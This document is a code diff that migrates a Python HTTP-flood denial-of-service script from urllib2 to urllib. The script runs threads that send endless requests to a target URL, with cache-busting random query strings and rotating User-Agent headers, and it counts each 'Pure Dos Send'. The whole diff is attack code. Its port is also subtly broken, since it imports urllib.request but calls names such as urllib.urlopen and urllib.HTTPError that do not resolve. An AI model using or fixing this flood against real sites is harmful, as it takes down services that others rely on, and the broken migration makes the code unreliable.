@@ -1,6 +1,6 @@
 import os
 import sys
-import urllib2
+import urllib.request
 import threading
 import random
 from banner import access
@@ -67,18 +67,18 @@ class httpth1(threading.Thread):
         while True:
             try:
                 #print ("\033[1;32m Attacking Website \033[1;m")
-                req = urllib2.Request(url + "?" + ascii(random.randint(3, 10)))
+                req = urllib.Request(url + "?" + ascii(random.randint(3, 10)))
                 #req = urllib2.Request(url)
                 req.add_header("User-Agent", random.choice(useragent()))
                 #req.add_header("User-Agent", "Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
                 req.add_header("Referer", referer)
-                urllib2.urlopen(req)
+                urllib.urlopen(req)
                 count += 1
                 print ("{0} Pure Dos Send".format(count))
-            except urllib2.HTTPError:
+            except urllib.HTTPError:
                 print ("\033[1;34m SERVER MIGHT ME DOWN \033[1;m")
                 pass
-            except urllib2.URLError:
+            except urllib.URLError:
                 print ("\033[1;34m URLERROR \033[1;m")
                 sys.exit()
             except ValueError:
